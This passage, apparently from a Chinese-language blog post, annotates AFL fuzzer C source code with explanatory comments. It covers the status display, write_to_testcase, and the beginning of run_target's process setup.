class="string">&quot;    map density : %s%-21s &quot;</span> bSTG bV <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">       t_byte_ratio &gt; <span class="number">70</span> ? cLRD : ((t_bytes &lt; <span class="number">200</span> &amp;&amp; !dumb_mode) ? cPIN : cRST),</span><br><span class="line">       tmp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 超时路径统计 */</span></span><br><span class="line">  <span class="built_in">sprintf</span>(tmp, <span class="string">&quot;%s (%0.02f%%)&quot;</span>, DI(cur_skipped_paths),</span><br><span class="line">          ((<span class="keyword">double</span>)cur_skipped_paths * <span class="number">100</span>) / queued_paths);</span><br><span class="line"></span><br><span class="line">  SAYF(bV bSTOP <span class="string">&quot; paths timed out : &quot;</span> cRST <span class="string">&quot;%-17s &quot;</span> bSTG bV, tmp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 计数覆盖率 */</span></span><br><span class="line">  <span class="built_in">sprintf</span>(tmp, <span class="string">&quot;%0.02f bits/tuple&quot;</span>, t_bytes ? (((<span class="keyword">double</span>)t_bits) / t_bytes) : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  SAYF(bSTOP <span class="string">&quot; count coverage : &quot;</span> cRST <span class="string">&quot;%-21s &quot;</span> bSTG bV <span class="string">&quot;\n&quot;</span>, tmp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 阶段进度和深度发现标题 */</span></span><br><span class="line">  SAYF(bVR bH bSTOP cCYA <span class="string">&quot; stage progress &quot;</span> bSTG bH20 bX bH bSTOP cCYA</span><br><span class="line">                         <span class="string">&quot; findings in depth &quot;</span> bSTG bH20 bVL <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 优先路径 */</span></span><br><span class="line">  <span class="built_in">sprintf</span>(tmp, <span class="string">&quot;%s (%0.02f%%)&quot;</span>, DI(queued_favored),</span><br><span class="line">          ((<span class="keyword">double</span>)queued_favored) * <span class="number">100</span> / queued_paths);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 当前尝试的变异策略 */</span></span><br><span class="line">  SAYF(bV bSTOP <span class="string">&quot;  now trying : &quot;</span> cRST <span class="string">&quot;%-21s &quot;</span> bSTG bV bSTOP</span><br><span class="line">                <span class="string">&quot; favored paths : &quot;</span> cRST <span class="string">&quot;%-22s &quot;</span> bSTG bV <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">       stage_name, tmp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 阶段执行进度 */</span></span><br><span class="line">  <span class="keyword">if</span> (!stage_max) &#123;</span><br><span class="line">    <span class="built_in">sprintf</span>(tmp, <span class="string">&quot;%s/-&quot;</span>, DI(stage_cur));</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">sprintf</span>(tmp, <span class="string">&quot;%s/%s (%0.02f%%)&quot;</span>, DI(stage_cur), DI(stage_max),</span><br><span class="line">            ((<span class="keyword">double</span>)stage_cur) * <span class="number">100</span> / stage_max);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  SAYF(bV bSTOP <span class="string">&quot; stage execs : &quot;</span> cRST <span class="string">&quot;%-21s &quot;</span> bSTG bV bSTOP, tmp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 有新边的路径 */</span></span><br><span class="line">  <span class="built_in">sprintf</span>(tmp, <span class="string">&quot;%s (%0.02f%%)&quot;</span>, DI(queued_with_cov),</span><br><span class="line">          ((<span class="keyword">double</span>)queued_with_cov) * <span class="number">100</span> / queued_paths);</span><br><span class="line"></span><br><span class="line">  SAYF(<span class="string">&quot;  new edges on : &quot;</span> cRST <span class="string">&quot;%-22s &quot;</span> bSTG bV <span class="string">&quot;\n&quot;</span>, tmp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 崩溃统计 */</span></span><br><span class="line">  <span class="built_in">sprintf</span>(tmp, <span class="string">&quot;%s (%s%s unique)&quot;</span>, DI(total_crashes), DI(unique_crashes),</span><br><span class="line">          (unique_crashes &gt;= KEEP_UNIQUE_CRASH) ? <span class="string">&quot;+&quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (crash_mode) &#123;</span><br><span class="line">    <span class="comment">/* 崩溃模式：显示新崩溃 */</span></span><br><span class="line">    SAYF(bV bSTOP <span class="string">&quot; total execs : &quot;</span> cRST <span class="string">&quot;%-21s &quot;</span> bSTG bV bSTOP</span><br><span class="line">                  <span class="string">&quot;   new crashes : %s%-22s &quot;</span> bSTG bV <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">         DI(total_execs), unique_crashes ? cLRD : cRST, tmp);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* 正常模式：显示总崩溃 */</span></span><br><span class="line">    SAYF(bV bSTOP <span class="string">&quot; total execs : &quot;</span> cRST <span class="string">&quot;%-21s &quot;</span> bSTG bV bSTOP</span><br><span class="line">                  <span class="string">&quot; total crashes : %s%-22s &quot;</span> bSTG bV <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">         DI(total_execs), unique_crashes ? cLRD : cRST, tmp);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 显示执行速度警告 */</span></span><br><span class="line">  <span class="keyword">if</span> (avg_exec &lt; <span class="number">100</span>) &#123;</span><br><span class="line">    <span class="comment">/* 执行速度过慢，用红色警告 */</span></span><br><span class="line">    <span class="built_in">sprintf</span>(tmp, <span class="string">&quot;%s/sec (%s)&quot;</span>, DF(avg_exec),</span><br><span class="line">            avg_exec &lt; <span class="number">20</span> ? <span class="string">&quot;zzzz...&quot;</span> : <span class="string">&quot;slow!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    SAYF(bV bSTOP <span class="string">&quot;  exec speed : &quot;</span> cLRD <span class="string">&quot;%-21s &quot;</span>, tmp);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">sprintf</span>(tmp, <span class="string">&quot;%s/sec&quot;</span>, DF(avg_exec));</span><br><span class="line">    SAYF(bV bSTOP <span class="string">&quot;  exec speed : &quot;</span> cRST <span class="string">&quot;%-21s &quot;</span>, tmp);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 超时统计 */</span></span><br><span class="line">  <span class="built_in">sprintf</span>(tmp, <span class="string">&quot;%s (%s%s unique)&quot;</span>, DI(total_tmouts), DI(unique_tmouts),</span><br><span class="line">          (unique_hangs &gt;= KEEP_UNIQUE_HANG) ? <span class="string">&quot;+&quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">  SAYF(bSTG bV bSTOP <span class="string">&quot;  total tmouts : &quot;</span> cRST <span class="string">&quot;%-22s &quot;</span> bSTG bV <span class="string">&quot;\n&quot;</span>, tmp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* fuzzing策略收益和路径几何标题 */</span></span><br><span class="line">  SAYF(bVR bH cCYA bSTOP</span><br><span class="line">       <span class="string">&quot; fuzzing strategy yields &quot;</span> bSTG bH10 bH bHT bH10 bH5 bHB bH bSTOP cCYA</span><br><span class="line">       <span class="string">&quot; path geometry &quot;</span> bSTG bH5 bH2 bH bVL <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 位翻转策略统计 */</span></span><br><span class="line">  <span class="keyword">if</span> (skip_deterministic) &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(tmp, <span class="string">&quot;n/a, n/a, n/a&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* 显示1位、2位、4位翻转的发现/循环比 */</span></span><br><span class="line">    <span class="built_in">sprintf</span>(tmp, <span class="string">&quot;%s/%s, %s/%s, %s/%s&quot;</span>, DI(stage_finds[STAGE_FLIP1]),</span><br><span class="line">            DI(stage_cycles[STAGE_FLIP1]), DI(stage_finds[STAGE_FLIP2]),</span><br><span class="line">            DI(stage_cycles[STAGE_FLIP2]), DI(stage_finds[STAGE_FLIP4]),</span><br><span class="line">            DI(stage_cycles[STAGE_FLIP4]));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  SAYF(bV bSTOP <span class="string">&quot;   bit flips : &quot;</span> cRST <span class="string">&quot;%-37s &quot;</span> bSTG bV bSTOP</span><br><span class="line">                <span class="string">&quot;    levels : &quot;</span> cRST <span class="string">&quot;%-10s &quot;</span> bSTG bV <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">       tmp, DI(max_depth));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 字节翻转策略统计 */</span></span><br><span class="line">  <span class="keyword">if</span> (!skip_deterministic)</span><br><span class="line">    <span class="built_in">sprintf</span>(tmp, <span class="string">&quot;%s/%s, %s/%s, %s/%s&quot;</span>, DI(stage_finds[STAGE_FLIP8]),</span><br><span class="line">            DI(stage_cycles[STAGE_FLIP8]), DI(stage_finds[STAGE_FLIP16]),</span><br><span class="line">            DI(stage_cycles[STAGE_FLIP16]), DI(stage_finds[STAGE_FLIP32]),</span><br><span class="line">            DI(stage_cycles[STAGE_FLIP32]));</span><br><span class="line"></span><br><span class="line">  SAYF(bV bSTOP <span class="string">&quot;  byte flips : &quot;</span> cRST <span class="string">&quot;%-37s &quot;</span> bSTG bV bSTOP</span><br><span class="line">                <span class="string">&quot;   pending : &quot;</span> cRST <span class="string">&quot;%-10s &quot;</span> bSTG bV <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">       tmp, DI(pending_not_fuzzed));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 算术运算策略统计 */</span></span><br><span class="line">  <span class="keyword">if</span> (!skip_deterministic)</span><br><span class="line">    <span class="built_in">sprintf</span>(tmp, <span class="string">&quot;%s/%s, %s/%s, %s/%s&quot;</span>, DI(stage_finds[STAGE_ARITH8]),</span><br><span class="line">            DI(stage_cycles[STAGE_ARITH8]), DI(stage_finds[STAGE_ARITH16]),</span><br><span class="line">            DI(stage_cycles[STAGE_ARITH16]), DI(stage_finds[STAGE_ARITH32]),</span><br><span class="line">            DI(stage_cycles[STAGE_ARITH32]));</span><br><span class="line"></span><br><span class="line">  SAYF(bV bSTOP <span class="string">&quot; arithmetics : &quot;</span> cRST <span class="string">&quot;%-37s &quot;</span> bSTG bV bSTOP</span><br><span class="line">                <span class="string">&quot;  pend fav : &quot;</span> cRST <span class="string">&quot;%-10s &quot;</span> bSTG bV <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">       tmp, DI(pending_favored));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 已知整数策略统计 */</span></span><br><span class="line">  <span class="keyword">if</span> (!skip_deterministic)</span><br><span class="line">    <span class="built_in">sprintf</span>(</span><br><span class="line">        tmp, <span class="string">&quot;%s/%s, %s/%s, %s/%s&quot;</span>, DI(stage_finds[STAGE_INTEREST8]),</span><br><span class="line">        DI(stage_cycles[STAGE_INTEREST8]), DI(stage_finds[STAGE_INTEREST16]),</span><br><span class="line">        DI(stage_cycles[STAGE_INTEREST16]), DI(stage_finds[STAGE_INTEREST32]),</span><br><span class="line">        DI(stage_cycles[STAGE_INTEREST32]));</span><br><span class="line"></span><br><span class="line">  SAYF(bV bSTOP <span class="string">&quot;  known ints : &quot;</span> cRST <span class="string">&quot;%-37s &quot;</span> bSTG bV bSTOP</span><br><span class="line">                <span class="string">&quot; own finds : &quot;</span> cRST <span class="string">&quot;%-10s &quot;</span> bSTG bV <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">       tmp, DI(queued_discovered));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 字典策略统计 */</span></span><br><span class="line">  <span class="keyword">if</span> (!skip_deterministic)</span><br><span class="line">    <span class="built_in">sprintf</span>(tmp, <span class="string">&quot;%s/%s, %s/%s, %s/%s&quot;</span>, DI(stage_finds[STAGE_EXTRAS_UO]),</span><br><span class="line">            DI(stage_cycles[STAGE_EXTRAS_UO]), DI(stage_finds[STAGE_EXTRAS_UI]),</span><br><span class="line">            DI(stage_cycles[STAGE_EXTRAS_UI]), DI(stage_finds[STAGE_EXTRAS_AO]),</span><br><span class="line">            DI(stage_cycles[STAGE_EXTRAS_AO]));</span><br><span class="line"></span><br><span class="line">  SAYF(bV bSTOP <span class="string">&quot;  dictionary : &quot;</span> cRST <span class="string">&quot;%-37s &quot;</span> bSTG bV bSTOP</span><br><span class="line">                <span class="string">&quot;  imported : &quot;</span> cRST <span class="string">&quot;%-10s &quot;</span> bSTG bV <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">       tmp, sync_id ? DI(queued_imported) : (u8 *)<span class="string">&quot;n/a&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* havoc（混沌）和splice（拼接）策略统计 */</span></span><br><span class="line">  <span class="built_in">sprintf</span>(tmp, <span class="string">&quot;%s/%s, %s/%s&quot;</span>, DI(stage_finds[STAGE_HAVOC]),</span><br><span class="line">          DI(stage_cycles[STAGE_HAVOC]), DI(stage_finds[STAGE_SPLICE]),</span><br><span class="line">          DI(stage_cycles[STAGE_SPLICE]));</span><br><span class="line"></span><br><span class="line">  SAYF(bV bSTOP <span class="string">&quot;       havoc : &quot;</span> cRST <span class="string">&quot;%-37s &quot;</span> bSTG bV bSTOP, tmp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 稳定性指标 */</span></span><br><span class="line">  <span class="keyword">if</span> (t_bytes)</span><br><span class="line">    <span class="built_in">sprintf</span>(tmp, <span class="string">&quot;%0.02f%%&quot;</span>, stab_ratio);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">strcpy</span>(tmp, <span class="string">&quot;n/a&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 根据稳定性设置颜色 */</span></span><br><span class="line">  SAYF(<span class="string">&quot; stability : %s%-10s &quot;</span> bSTG bV <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">       (stab_ratio &lt; <span class="number">85</span> &amp;&amp; var_byte_count &gt; <span class="number">40</span>)</span><br><span class="line">           ? cLRD  <span class="comment">/* 稳定性差，红色 */</span></span><br><span class="line">           : ((queued_variable &amp;&amp; (!persistent_mode || var_byte_count &gt; <span class="number">20</span>))</span><br><span class="line">                  ? cMGN  <span class="comment">/* 有变量路径，洋红色 */</span></span><br><span class="line">                  : cRST),  <span class="comment">/* 正常，重置颜色 */</span></span><br><span class="line">       tmp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 修剪效率统计 */</span></span><br><span class="line">  <span class="keyword">if</span> (!bytes_trim_out) &#123;</span><br><span class="line">    <span class="built_in">sprintf</span>(tmp, <span class="string">&quot;n/a, &quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* 显示修剪节省的百分比和执行次数 */</span></span><br><span class="line">    <span class="built_in">sprintf</span>(tmp, <span class="string">&quot;%0.02f%%/%s, &quot;</span>,</span><br><span class="line">            ((<span class="keyword">double</span>)(bytes_trim_in - bytes_trim_out)) * <span class="number">100</span> / bytes_trim_in,</span><br><span class="line">            DI(trim_execs));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 块效率统计 */</span></span><br><span class="line">  <span class="keyword">if</span> (!blocks_eff_total) &#123;</span><br><span class="line">    u8 tmp2[<span class="number">128</span>];</span><br><span class="line">    <span class="built_in">sprintf</span>(tmp2, <span class="string">&quot;n/a&quot;</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(tmp, tmp2);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    u8 tmp2[<span class="number">128</span>];</span><br><span class="line">    <span class="comment">/* 显示未选择的块百分比 */</span></span><br><span class="line">    <span class="built_in">sprintf</span>(tmp2, <span class="string">&quot;%0.02f%%&quot;</span>,</span><br><span class="line">            ((<span class="keyword">double</span>)(blocks_eff_total - blocks_eff_select)) * <span class="number">100</span> /</span><br><span class="line">                blocks_eff_total);</span><br><span class="line">    <span class="built_in">strcat</span>(tmp, tmp2);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 显示修剪统计并绘制底部边框 */</span></span><br><span class="line">  SAYF(bV bSTOP <span class="string">&quot;        trim : &quot;</span> cRST <span class="string">&quot;%-37s &quot;</span> bSTG bVR bH20 bH2 bH2 bRB</span><br><span class="line">                <span class="string">&quot;\n&quot;</span> bLB bH30 bH20 bH2 bH bRB bSTOP cRST RESET_G1,</span><br><span class="line">       tmp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ========== CPU使用率统计 ========== */</span></span><br><span class="line">  <span class="keyword">if</span> (cpu_core_count) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">double</span> cur_runnable = get_runnable_processes();  <span class="comment">/* 获取可运行进程数 */</span></span><br><span class="line">    u32 cur_utilization = cur_runnable * <span class="number">100</span> / cpu_core_count;  <span class="comment">/* CPU使用率 */</span></span><br><span class="line"></span><br><span class="line">    u8 *cpu_color = cCYA;  <span class="comment">/* 默认青色 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 如果还能运行更多进程，使用绿色 */</span></span><br><span class="line">    <span class="keyword">if</span> (cpu_core_count &gt; <span class="number">1</span> &amp;&amp; cur_runnable + <span class="number">1</span> &lt;= cpu_core_count)</span><br><span class="line">      cpu_color = cLGN;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 如果明显超载，使用红色 */</span></span><br><span class="line">    <span class="keyword">if</span> (!no_cpu_meter_red &amp;&amp; cur_utilization &gt;= <span class="number">150</span>)</span><br><span class="line">      cpu_color = cLRD;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_AFFINITY</span></span><br><span class="line">    <span class="comment">/* 如果设置了CPU亲和性 */</span></span><br><span class="line">    <span class="keyword">if</span> (cpu_aff &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">      SAYF(SP10 cGRA <span class="string">&quot;[cpu%03u:%s%3u%%&quot;</span> cGRA <span class="string">&quot;]\r&quot;</span> cRST, MIN(cpu_aff, <span class="number">999</span>),</span><br><span class="line">           cpu_color, MIN(cur_utilization, <span class="number">999</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      SAYF(SP10 cGRA <span class="string">&quot;   [cpu:%s%3u%%&quot;</span> cGRA <span class="string">&quot;]\r&quot;</span> cRST, cpu_color,</span><br><span class="line">           MIN(cur_utilization, <span class="number">999</span>));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="comment">/* 没有CPU亲和性支持 */</span></span><br><span class="line">    SAYF(SP10 cGRA <span class="string">&quot;   [cpu:%s%3u%%&quot;</span> cGRA <span class="string">&quot;]\r&quot;</span> cRST, cpu_color,</span><br><span class="line">         MIN(cur_utilization, <span class="number">999</span>));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ^HAVE_AFFINITY */</span></span></span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    SAYF(<span class="string">&quot;\r&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 刷新输出缓冲区 */</span></span><br><span class="line">  fflush(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="write-to-testcase"><a href="#write-to-testcase" class="headerlink" title="write_to_testcase"></a>write_to_testcase</h4><p>这段代码是 AFL 中负责将变异后的测试用例写入文件的函数，以便后面使用该文件输入到要fuzz的程序中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">write_to_testcase</span><span class="params">(<span class="keyword">void</span> *mem, u32 len)</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  s32 fd = out_fd;  <span class="comment">/* 默认使用全局文件描述符 out_fd */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* ========== 模式1：文件模式 ========== */</span></span><br><span class="line">  <span class="keyword">if</span> (out_file) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 删除已存在的同名文件（如果有的话）</span></span><br><span class="line"><span class="comment">     * 忽略错误是因为文件可能不存在，这是正常的 */</span></span><br><span class="line">    unlink(out_file); </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 创建新的测试用例文件</span></span><br><span class="line"><span class="comment">     * O_WRONLY: 只写模式</span></span><br><span class="line"><span class="comment">     * O_CREAT:  如果文件不存在则创建</span></span><br><span class="line"><span class="comment">     * O_EXCL:   与 O_CREAT 配合，确保创建新文件（如果文件已存在则失败）</span></span><br><span class="line"><span class="comment">     * 0600:     文件权限（拥有者可读写，其他人无权限）</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    fd = open(out_file, O_WRONLY | O_CREAT | O_EXCL, <span class="number">0600</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 文件创建失败则终止程序 */</span></span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">      PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, out_file);</span><br><span class="line">      </span><br><span class="line">  &#125; </span><br><span class="line">  <span class="comment">/* ========== 模式2：文件描述符模式 ========== */</span></span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 将文件指针移到开头，准备覆盖原有内容</span></span><br><span class="line"><span class="comment">     * 这种模式用于重复使用同一个文件，避免频繁创建/删除文件的开销</span></span><br><span class="line"><span class="comment">     * 通常用于使用共享内存或者预先打开的文件的情况 */</span></span><br><span class="line">    lseek(fd, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* ========== 写入数据 ========== */</span></span><br><span class="line">  <span class="comment">/* ck_write 是 AFL 的安全写入函数，确保所有数据都被写入</span></span><br><span class="line"><span class="comment">   * 它会处理部分写入的情况（当 write() 返回值小于请求的字节数时） */</span></span><br><span class="line">  ck_write(fd, mem, len, out_file);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* ========== 后处理 ========== */</span></span><br><span class="line">  <span class="keyword">if</span> (!out_file) &#123;</span><br><span class="line">    <span class="comment">/* 文件描述符模式的后处理 */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 截断文件到指定长度</span></span><br><span class="line"><span class="comment">     * 这很重要，因为新的测试用例可能比之前的短</span></span><br><span class="line"><span class="comment">     * 如果不截断，文件末尾可能保留旧数据，导致测试不准确 */</span></span><br><span class="line">    <span class="keyword">if</span> (ftruncate(fd, len))</span><br><span class="line">      PFATAL(<span class="string">&quot;ftruncate() failed&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 将文件指针重新移到开头</span></span><br><span class="line"><span class="comment">     * 这样目标程序从头开始读取时能获得正确的数据 */</span></span><br><span class="line">    lseek(fd, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 注意：文件描述符模式下不关闭文件，因为会被重复使用 */</span></span><br><span class="line">    </span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* 文件模式的后处理 */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 关闭文件描述符</span></span><br><span class="line"><span class="comment">     * 文件模式下每次都创建新文件，所以用完要关闭 */</span></span><br><span class="line">    close(fd);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="run-target"><a href="#run-target" class="headerlink" title="run_target"></a>run_target</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> u8 <span class="title">run_target</span><span class="params">(<span class="keyword">char</span> **argv, u32 timeout)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">itimerval</span> <span class="title">it</span>;</span>      <span class="comment">/* 定时器结构 */</span></span><br><span class="line">  <span class="keyword">static</span> u32 prev_timed_out = <span class="number">0</span>;   <span class="comment">/* 上次是否超时的标志 */</span></span><br><span class="line">  <span class="keyword">static</span> u64 exec_ms = <span class="number">0</span>;          <span class="comment">/* 执行时间（毫秒） */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> status = <span class="number">0</span>;                  <span class="comment">/* 子进程退出状态 */</span></span><br><span class="line">  u32 tb4;                         <span class="comment">/* trace_bits 的前4字节，用于快速检查 */</span></span><br><span class="line"></span><br><span class="line">  child_timed_out = <span class="number">0</span>;             <span class="comment">/* 清空子进程超时标志 */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ========== 重置共享内存 ========== */</span></span><br><span class="line">  <span class="comment">/* 在执行目标程序前，清空覆盖信息收集区域</span></span><br><span class="line"><span class="comment">   * trace_bits[] 是与目标程序共享的内存，用于记录代码覆盖情况</span></span><br><span class="line"><span class="comment">   * </span></span><br><span class="line"><span class="comment">   * 注意：这个 memset 之后，trace_bits[] 变成 volatile（易变的）</span></span><br><span class="line"><span class="comment">   * 必须使用内存屏障防止编译器优化重排序 */</span></span><br><span class="line">  <span class="built_in">memset</span>(trace_bits, <span class="number">0</span>, MAP_SIZE);</span><br><span class="line">  MEM_BARRIER();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ========== 模式1：Dumb模式（无fork服务器） ========== */</span></span><br><span class="line">  <span class="comment">/* Dumb模式用于：</span></span><br><span class="line"><span class="comment">   * 1. 目标程序没有编译进AFL的插桩代码</span></span><br><span class="line"><span class="comment">   * 2. 用户明确禁用了fork服务器</span></span><br><span class="line"><span class="comment">   * 这种模式效率较低，每次都要fork+execve */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (dumb_mode == <span class="number">1</span> || no_forkserver) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 创建子进程 */</span></span><br><span class="line">    child_pid = fork();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (child_pid &lt; <span class="number">0</span>)</span><br><span class="line">      PFATAL(<span class="string">&quot;fork() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ===== 子进程代码 ===== */</span></span><br><span class="line">    <span class="keyword">if</span> (!child_pid) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 设置内存限制（如果指定了的话） */</span></span><br><span class="line">      <span class="keyword">if</span> (mem_limit) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 将内存限制从MB转换为字节 */</span></span><br><span class="line">        r.rlim_max = r.rlim_cur = ((<span class="keyword">rlim_t</span>)mem_limit) &lt;&lt; <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RLIMIT_AS</span></span><br><span class="line">        <span class="comment">/* 优先限制虚拟内存总量 */</span></span><br><span class="line">        setrlimit(RLIMIT_AS, &amp;r); <span class="comment">/* Ignore errors */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">        <span class="comment">/* 如果系统不支持RLIMIT_AS，则限制数据段大小 */</span></span><br><span class="line">        setrlimit(RLIMIT_DATA, &amp;r); <span class="comment">/* Ignore errors */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ^RLIMIT_AS */</span></span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 禁止生成core dump文件（避免磁盘被填满） */</span></span><br><span class="line">      r.rlim_max = r.rlim_cur = <span class="number">0</span>;</span><br><span class="line">      setrlimit(RLIMIT_CORE, &amp;r); <span class="comment">/* Ignore errors */</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* ===== 配置进程环境 ===== */</span></span><br><span class="line">      </span><br><span class="line">      <span class="comment">/* 创建新的会话，脱离控制终端</span></span><br><span class="line"><span class="comment">       * 这样可以防止目标程序干扰fuzzer的终端 */</span></span><br><span class="line">      setsid();</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 将标准输出和标准错误重定向到/dev/null</span></span><br><span class="line"><span class="comment">       * 避免目标程序的输出干扰AFL的界面 */</span></span><br><span class="line">      dup2(dev_null_fd, <span class="number">1</span>);</span><br><span class="line">      dup2(dev_null_fd, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 配置标准输入 */</span></span><br><span class="line">      <span class="keyword">if</span> (out_file) &#123;</span><br><span class="line">        <span class="comment">/* 文件输入模式：stdin指向/dev/null */</span></span><br><span class="line">        dup2(dev_null_fd, <span class="number">0</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* 标准输入模式：stdin指向测试用例 */</span></span><br><span class="line">        dup2(out_fd, <span class="number">0</span>);</span><br><span class="line">        close(out_fd);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 关闭不需要的文件描述符</span></span><br><span class="line"><span class="comment">       * 注：在Linux上使用O_CLOEXEC会更快，这是一个潜在的优化点 */</span></span><br><span class="line">      close(dev_null_fd);</span><br><span class="line">      close(out_dir_fd);</span><br><span class="line">      close(dev_urandom_fd);</span><br><span class="line">      close(fileno(plot_file));</span><br><span class="line"></span><br><span 